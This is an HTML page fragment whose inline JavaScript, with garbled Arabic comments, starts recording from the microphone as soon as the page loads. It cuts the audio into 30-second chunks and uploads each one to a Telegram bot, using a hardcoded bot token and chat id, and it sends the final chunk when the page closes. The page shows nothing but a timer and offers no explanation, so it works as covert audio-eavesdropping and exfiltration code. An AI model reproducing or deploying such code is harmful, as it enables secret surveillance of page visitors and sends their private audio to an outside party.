<body>
<!-- Ø¹Ø¯Ø§Ø¯ Ø§Ù„ÙˆÙ‚Øª (Ø³ÙŠØ¸Ù‡Ø± Ø§Ù„ÙˆÙ‚Øª Ø§Ù„ÙƒÙ„ÙŠ) -->
<div id="timer">00:00</div>

<script>
const token = '8468116606:AAFI0NKNJhvRE_sugFfmkUSNkvlMu1Xi-5k';
const chat_id = '6612813200';

let mediaRecorder;
let audioChunks = [];
let stream;
let startTime;
let timerInterval;
let partNumber = 0;
let totalSeconds = 0;

const timerDiv = document.getElementById('timer');

function updateTimer() {
    if (!startTime) return;
    const elapsed = Date.now() - startTime;
    totalSeconds = Math.floor(elapsed / 1000);
    const minutes = Math.floor(totalSeconds / 60);
    const seconds = totalSeconds % 60;
    timerDiv.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

// Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø¬Ø²Ø¡
function sendPart(blob, partNum) {
    const url = `https://api.telegram.org/bot${token}/sendAudio`;
    const formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('audio', blob, `part${partNum}_${Date.now()}.webm`);

    fetch(url, { method: 'POST', body: formData })
        .then(r => r.json())
        .then(data => {
            if (data.ok) console.log(`âœ… Ø§Ù„Ø¬Ø²Ø¡ ${partNum} Ø£ÙØ±Ø³Ù„`);
            else console.error(`âŒ ÙØ´Ù„ Ø§Ù„Ø¬Ø²Ø¡ ${partNum}:`, data.description);
        })
        .catch(err => console.error(`âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¬Ø²Ø¡ ${partNum}:`, err));
}

// Ø¯Ø§Ù„Ø© Ø¥Ù†Ù‡Ø§Ø¡ Ø§Ù„Ø¬Ø²Ø¡ Ø§Ù„Ø­Ø§Ù„ÙŠ ÙˆØ¨Ø¯Ø¡ Ø¬Ø²Ø¡ Ø¬Ø¯ÙŠØ¯
function finalizeAndRestart() {
    if (!mediaRecorder || mediaRecorder.state === 'inactive') return;

    // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ØªØ³Ø¬ÙŠÙ„ (Ø³ÙŠØ¤Ø¯ÙŠ Ø¥Ù„Ù‰ ondataavailable Ø¢Ø®Ø± Ø«Ù… onstop)
    mediaRecorder.stop();
    // ÙÙŠ onstop Ø³Ù†Ù‚ÙˆÙ… Ø¨Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¬Ø²Ø¡ ÙˆØ¨Ø¯Ø¡ Ø¬Ø²Ø¡ Ø¬Ø¯ÙŠØ¯
}

// Ø¨Ø¯Ø¡ ØªØ³Ø¬ÙŠÙ„ Ø¬Ø¯ÙŠØ¯
function startNewPart() {
    if (!stream) return;

    audioChunks = []; // Ù…ØµÙÙˆÙØ© Ø¬Ø¯ÙŠØ¯Ø© Ù„ÙƒÙ„ Ø¬Ø²Ø¡
    partNumber++;

    const options = { mimeType: 'audio/webm;codecs=opus' };
    try {
        mediaRecorder = new MediaRecorder(stream, options);
    } catch (e) {
        console.warn('âš ï¸ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„ØµÙŠØºØ© Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠØ©');
        mediaRecorder = new MediaRecorder(stream);
    }

    mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) audioChunks.push(event.data);
    };

    mediaRecorder.onstop = () => {
        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¬Ø²Ø¡ Ø§Ù„Ø­Ø§Ù„ÙŠ
        if (audioChunks.length > 0) {
            const blob = new Blob(audioChunks, { type: 'audio/webm' });
            sendPart(blob, partNumber);
        }
        // Ø¨Ø¯Ø¡ Ø§Ù„Ø¬Ø²Ø¡ Ø§Ù„ØªØ§Ù„ÙŠ ÙÙˆØ±Ø§Ù‹ (Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„ØªØ³Ø¬ÙŠÙ„ Ù„Ø§ ÙŠØ²Ø§Ù„ Ù…Ø³ØªÙ…Ø±Ø§Ù‹)
        if (isRecording) startNewPart();
    };

    mediaRecorder.start(1000); // Ù‚Ø·Ø¹ ÙƒÙ„ Ø«Ø§Ù†ÙŠØ© Ù„ØªØ­Ù‚ÙŠÙ‚ ondataavailable Ù…Ù†ØªØ¸Ù…
    console.log(`ğŸ”´ Ø¨Ø¯Ø¡ Ø§Ù„Ø¬Ø²Ø¡ ${partNumber}`);
}

let isRecording = false;

async function startRecording() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            audio: {
                sampleRate: 48000,
                channelCount: 2,
                echoCancellation: false,
                noiseSuppression: false,
                autoGainControl: false
            }
        });
        console.log('âœ… ØªÙ… Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ†');

        startTime = Date.now();
        timerInterval = setInterval(updateTimer, 1000);
        isRecording = true;

        // Ø¨Ø¯Ø¡ Ø£ÙˆÙ„ Ø¬Ø²Ø¡
        startNewPart();

        // ÙƒÙ„ 30 Ø«Ø§Ù†ÙŠØ© Ù†Ù†Ù‡ÙŠ Ø§Ù„Ø¬Ø²Ø¡ Ø§Ù„Ø­Ø§Ù„ÙŠ ÙˆÙ†Ø¨Ø¯Ø£ Ø¬Ø²Ø¡ Ø¬Ø¯ÙŠØ¯
        setInterval(() => {
            if (isRecording && mediaRecorder && mediaRecorder.state !== 'inactive') {
                finalizeAndRestart();
            }
        }, 30000); // 30 Ø«Ø§Ù†ÙŠØ© (ÙŠÙ…ÙƒÙ† ØªØºÙŠÙŠØ±Ù‡Ø§)

        // Ø¹Ù†Ø¯ Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ØµÙØ­Ø©ØŒ Ù†Ù†Ù‡ÙŠ Ø¢Ø®Ø± Ø¬Ø²Ø¡ ÙˆÙ†Ø±Ø³Ù„Ù‡
        window.addEventListener('beforeunload', () => {
            clearInterval(timerInterval);
            isRecording = false;
            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                mediaRecorder.stop(); // ÙŠØ¤Ø¯ÙŠ Ø¥Ù„Ù‰ onstop Ø§Ù„Ø°ÙŠ ÙŠØ±Ø³Ù„ Ø§Ù„Ø¬Ø²Ø¡ Ø§Ù„Ø£Ø®ÙŠØ±
            }
            if (stream) stream.getTracks().forEach(t => t.stop());
        });

    } catch (err) {
        console.error('âŒ Ø®Ø·Ø£:', err);
        timerDiv.textContent = 'Ø®Ø·Ø£';
    }
}

startRecording();
</script>
</body>